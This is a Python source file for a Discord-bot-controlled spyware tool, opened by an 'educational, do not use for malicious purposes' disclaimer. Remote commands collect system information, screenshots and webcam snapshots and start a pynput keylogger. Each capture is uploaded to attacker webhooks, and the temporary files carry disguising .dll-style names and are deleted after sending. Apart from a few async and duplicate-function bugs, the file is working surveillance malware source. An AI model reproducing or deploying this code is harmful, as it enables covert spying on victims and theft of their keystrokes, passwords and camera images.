########################################
# This is an educational piece of code,
# do not use for malicious purposes
########################################

# more features may be added later


import time
import requests
import pyautogui
import cv2
import platform
import psutil
import socket
import os
import pynput
import threading
import discord
from discord.ext import commands

TOKEN = "your bot token"
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

#@bot.command()
#async def test(ctx):
#    await ctx.send("ok")


@bot.command()
async def options(ctx):
    commands_list = """```
!sysinfo       - Captures system info
!ss            - Captures a screenshot
!webcam        - Captures webcam footage
!startkeylog   - Begins logging keystrokes
!stopkeylog    - Stops logging keystrokes
```"""
    await ctx.send(commands_list)

@bot.command()
async def ss(ctx):
    await send_screenshot()

@bot.command()
async def webcam(ctx):
    await send_webcam_snapshot()
@bot.command()
async def sysinfo(ctx):
    await send_system_info()

keylogger_running = False
keylogger_thread = None
def start_keylogger():
    global keylogger_running
    keylogger_running = True
    
    while keylogger_running:
        print("Logging keys")
        time.sleep(1)

    print("Keylogger stopped")

@bot.command()
async def startkeylog(ctx):
    global keylogger_running, keylogger_thread

    if keylogger_running:
        await ctx.send("Keylogger active")
        return

    await ctx.send("Starting keylogger")
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

@bot.command()
async def stopkeylog(ctx):
    global keylogger_running

    if not keylogger_running:
        await ctx.send("Keylogger is not running!")
        return

    await ctx.send("Stopping keylogger...")
    keylogger_running = False
    
    if keylogger_thread:
        keylogger_thread.join()
    await ctx.send("Keylogger stopped.")


ss = "your webhook"
web = "your webhook"
si = "your webhook"
keylog_webhook = "your webhook"

def get_system_info():
    info2 = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.architecture()[0],
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM Size (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "Disk Space (GB)": round(psutil.disk_usage('/').total / (1024 ** 3), 2),
        "Available Disk (GB)": round(psutil.disk_usage('/').free / (1024 ** 3), 2),
    }
    return info2

def send_system_info():
    info = get_system_info()
    formatted_info = "\n".join([f"**{key}:** {value}" for key, value in info.items()])

    payload = {"content": f"```yaml\n{formatted_info}\n```"}
    response = requests.post(si, json=payload)
    
    if response.status_code == 200:
        print("System info sent")
    else:
        print(f"Failed to send system info: {response.status_code}")

def send_screenshot():
    screenshot_path = "system.dll.png"
    pyautogui.screenshot(screenshot_path)

    with open(screenshot_path, "rb") as file:
        response = requests.post(ss, files={"file": file})
    
    os.remove(screenshot_path)

    if response.status_code == 200:
        print("Screenshot sent")
    else:
        print(f"Failed to send ss: {response.status_code}")



def send_webcam_snapshot():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if ret:
        snapshot_path = "windows64.dll.jpg"
        cv2.imwrite(snapshot_path, frame)

        with open(snapshot_path, "rb") as file:
            response = requests.post(web, files={"file": file})
            
        os.remove(snapshot_path)

        if response.status_code == 200:
            print("Webcam snapshot sent")
        else:
            print(f"Failed to send webcam snapshot: {response.status_code}")
    else:
        print("Failed to capture webcam pic")


def send_key(key):
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    payload = {"content": f"**Key Pressed:** `{key}`"}
    response = requests.post(keylog_webhook, json=payload)

    if response.status_code == 200:
        print(f"Key '{key}' sent successfully")
    else:
        print(f"Failed to send key '{key}': {response.status_code}")

def start_keylogger():
    with pynput.keyboard.Listener(on_press=send_key) as listener:
        listener.join()


bot.run(TOKEN)
